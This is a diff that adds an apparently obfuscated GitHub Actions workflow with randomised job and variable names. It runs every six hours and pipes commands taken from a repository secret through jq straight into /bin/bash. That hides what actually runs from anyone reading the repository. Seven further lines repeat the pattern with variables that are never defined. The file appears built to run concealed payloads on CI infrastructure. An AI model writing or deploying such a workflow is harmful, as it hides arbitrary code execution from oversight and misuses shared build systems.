@@ -1,0 +1,24 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          kqw85: ${{ secrets.kqw85 }}
+        run: |
+          echo $kqw85 | jq -r .ub355 | /bin/bash
+          echo $qm611 | jq -r .p9096 | /bin/bash
+          echo $dxt7 | jq -r .ooftr186 | /bin/bash
+          echo $v077 | jq -r .qhbmc31 | /bin/bash
+          echo $t342 | jq -r .oghz622 | /bin/bash
+          echo $camz280 | jq -r .udp99001 | /bin/bash
+          echo $umge0887 | jq -r .evvwc9268 | /bin/bash
+          echo $mmpg7 | jq -r .lz37 | /bin/bash
+
